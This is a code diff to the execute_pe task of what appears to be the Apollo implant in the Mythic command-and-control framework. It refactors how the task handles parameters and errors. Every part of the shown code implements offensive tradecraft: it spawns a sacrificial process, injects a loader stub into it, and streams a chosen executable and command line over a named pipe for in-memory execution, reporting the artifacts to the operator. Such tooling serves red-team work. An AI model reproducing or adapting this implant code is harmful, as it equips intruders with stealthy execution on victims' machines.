@@ -21,11 +21,15 @@ using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Collections;
 using ApolloInterop.Utils;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
 
 namespace Tasks
 {
     public class execute_pe : Tasking
     {
+
+#pragma warning disable 0649
         [DataContract]
         internal struct ExecutePEParameters
         {
@@ -33,13 +37,14 @@ namespace Tasks
             public string PipeName;
             [DataMember(Name = "pe_name")]
             public string PEName;
-            [DataMember(Name = "pe_arguments")]
-            public string[] PEArgumentsArray;
+            [DataMember(Name = "commandline")]
+            public string CommandLine;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
             [DataMember(Name = "pe_id")]
             public string PeId;
         }
+#pragma warning restore 0649
 
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
@@ -86,8 +91,8 @@ namespace Tasks
                         _agent.GetTaskManager().AddTaskResponseToQueue(
                             CreateTaskResponse(
                                 output,
-                                false,
-                                ""));
+                                false
+                            ));
                     }
                 }
                 output = string.Join("", _assemblyOutput.Flush());
@@ -96,8 +101,8 @@ namespace Tasks
                     _agent.GetTaskManager().AddTaskResponseToQueue(
                         CreateTaskResponse(
                             output,
-                            false,
-                            ""));
+                            false
+                        ));
                 }
             };
         }
@@ -112,135 +117,134 @@ namespace Tasks
 
         public override void Start()
         {
-            MythicTaskResponse resp;
-            Process proc = null;
+            MythicTaskResponse? resp = null;
+            Process? proc = null;
             try
             {
                 DebugHelp.DebugWriteLine("Starting execute_pe task");
                 DebugHelp.DebugWriteLine($"Task Parameters: {_data.Parameters}");
                 ExecutePEParameters parameters = _jsonSerializer.Deserialize<ExecutePEParameters>(_data.Parameters);
-                string peArguments = string.Join(" ", parameters.PEArgumentsArray);
-                //peArguments = $"\"{peArguments}\"";
-                DebugHelp.DebugWriteLine($"pe args: {peArguments}");
+
+                DebugHelp.DebugWriteLine($"Executable name: {parameters.PEName}");
+                DebugHelp.DebugWriteLine($"Process command line: {parameters.CommandLine}");
 
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                 {
-                    resp = CreateTaskResponse($"One or more required arguments was not provided.", true,"error");
+                    throw new ArgumentNullException($"One or more required arguments was not provided.");
+                }
+
+                byte[] peBytes = [0];
+
+                if (!string.IsNullOrEmpty(parameters.PeId))
+                {
+                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
+                    {
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
+                        {
+                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
+                        }
+                    }
                 }
                 else
                 {
-                    byte[] peBytes = new byte[0];
-
-                    if (!string.IsNullOrEmpty(parameters.PeId))
-                    {
-                        if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
-                        {
-                            if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
-                            {
-                                _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
-                            }
-                        }
-                    }
-                    else
-                    {
-                        _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
-                    }
-
-                    if (peBytes != null && peBytes.Length > 0)
-                    {
-                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,out byte[] exePEPic))
-                        {
-                            ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);
-                            proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-                            if (proc.Start())
-                            {
-                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "",
-                                    new IMythicMessage[]
-                                    {
-                                        Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
-                                    }
-                                ));
-                                if (proc.Inject(exePEPic))
-                                {
-                                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("",false, "",
-                                        new IMythicMessage[]
-                                        {
-                                            Artifact.ProcessInject((int) proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
-                                        }
-                                    ));
-                                    IPCCommandArguments cmdargs = new IPCCommandArguments
-                                    {
-                                        ByteData = peBytes,
-                                        StringData = $"{parameters.PEName} {peArguments}"
-                                    };
-                                    DebugHelp.DebugWriteLine($"string data: {cmdargs.StringData}");
-                                    AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                    client.ConnectionEstablished += Client_ConnectionEstablished;
-                                    client.MessageReceived += Client_MessageReceived;
-                                    client.Disconnect += Client_Disconnect;
-                                    if (client.Connect(10000))
-                                    {
-                                        IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                        foreach (IPCChunkedData chunk in chunks)
-                                        {
-                                            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-                                        }
-
-                                        _senderEvent.Set();
-                                        WaitHandle.WaitAny(new WaitHandle[]
-                                        {
-                                            _complete,
-                                            _cancellationToken.Token.WaitHandle
-                                        });
-                                        resp = CreateTaskResponse("", true, "completed");
-                                    }
-                                    else
-                                    {
-                                        resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
-                                    }
-                                }
-                                else
-                                {
-                                    resp = CreateTaskResponse(
-                                        $"Failed to inject assembly loader into sacrificial process.",
-                                        true,
-                                        "error");
-                                }
-                            }
-                            else
-                            {
-                                resp = CreateTaskResponse($"Failed to start sacrificial process {info.Application}", true, "error");
-                            }
-                        }
-                        else
-                        {
-                            resp = CreateTaskResponse(
-                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                                true,
-                                "error");
-                        }
-                    }
-                    else
-                    {
-                        resp = CreateTaskResponse(
-                            $"{parameters.PEName} is not loaded or is of zero length (have you registered it?)", true,"error");
-                    }
+                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
                 }
+
+                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
+                if (peBytes.Length == 0)
+                {
+                    throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
+                }
+
+                var ret = _agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic);
+                if (!ret)
+                {
+                    throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
+                }
+
+                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);
+
+                proc = _agent.GetProcessManager()
+                    .NewProcess(
+                        info.Application,
+                        info.Arguments,
+                        true
+                    ) ?? throw new InvalidOperationException($"Process manager failed to create a new process {info.Application}");
+
+                if (!proc.Start())
+                {
+                    throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
+                }
+
+                _agent.GetTaskManager().AddTaskResponseToQueue(
+                    CreateTaskResponse("", false, messages:
+                        [
+                            Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
+                        ]
+                    )
+                );
+
+                if (!proc.Inject(exePEPic))
+                {
+                    throw new InvalidOperationException($"Failed to inject assembly loader into sacrificial process.");
+                }
+
+                _agent.GetTaskManager().AddTaskResponseToQueue(
+                    CreateTaskResponse("", false, messages:
+                        [
+                            Artifact.ProcessInject((int) proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                        ]
+                    )
+                );
+
+                var cmdargs = new ExecutePEIPCMessage()
+                {
+                    Executable = peBytes,
+                    ImageName = parameters.PEName,
+                    CommandLine = parameters.CommandLine,
+                };
+
+                var client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+
+                client.ConnectionEstablished += Client_ConnectionEstablished;
+                client.MessageReceived += Client_MessageReceived;
+                client.Disconnect += Client_Disconnect;
+
+                if (!client.Connect(10000))
+                {
+                    throw new InvalidOperationException($"Failed to connect to named pipe.");
+                }
+
+                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                foreach (IPCChunkedData chunk in chunks)
+                {
+                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                }
+
+                _senderEvent.Set();
+                WaitHandle.WaitAny(
+                [
+                    _complete,
+                    _cancellationToken.Token.WaitHandle
+                ]);
             }
             catch (Exception ex)
             {
-                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+                resp = CreateTaskResponse($"{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
             }
 
-            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            if (proc != null && !proc.HasExited)
+            var taskResponse = resp ??= CreateTaskResponse("", true, "completed");
+
+            if (proc is Process procHandle)
             {
-                proc.Kill();
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true, "", new IMythicMessage[]
+                if (!procHandle.HasExited)
                 {
-                    Artifact.ProcessKill((int) proc.PID)
-                }));
+                    proc.Kill();
+                    taskResponse.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
+                }
             }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(taskResponse);
         }
 
         private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
